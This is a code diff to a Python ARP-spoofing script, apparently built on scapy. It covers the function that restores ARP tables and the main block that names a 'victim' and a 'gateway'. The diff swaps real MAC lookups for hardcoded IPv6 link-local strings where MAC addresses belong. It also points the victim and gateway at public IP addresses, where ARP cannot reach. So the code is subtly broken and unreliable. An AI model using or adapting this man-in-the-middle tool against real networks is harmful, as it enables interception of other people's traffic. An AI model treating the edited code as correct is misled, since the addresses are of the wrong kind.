@@ -72,9 +72,9 @@ def restore(target_ip, host_ip, verbose=True):
     (real IP and MAC of `host_ip` ) to `target_ip`
     """
     # get the real MAC address of target
-    target_mac = get_mac(target_ip)
+    target_mac = "fe80::837:a5ff:fe9c:1ff"
     # get the real MAC address of spoofed (gateway, i.e router)
-    host_mac = get_mac(host_ip)
+    host_mac = "fe80::8ac:6eff:fe25:6aa5"
     # crafting the restoring packet
     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
     # sending the restoring packet
@@ -86,9 +86,9 @@ def restore(target_ip, host_ip, verbose=True):
 
 if __name__ == "__main__":
     # victim ip address
-    target = "192.168.1.100"
+    target = "34.221.55.14"
     # gateway ip address
-    host = "192.168.1.1"
+    host = "34.210.3.49"
     # print progress to the screen
     verbose = True
     # enable ip forwarding
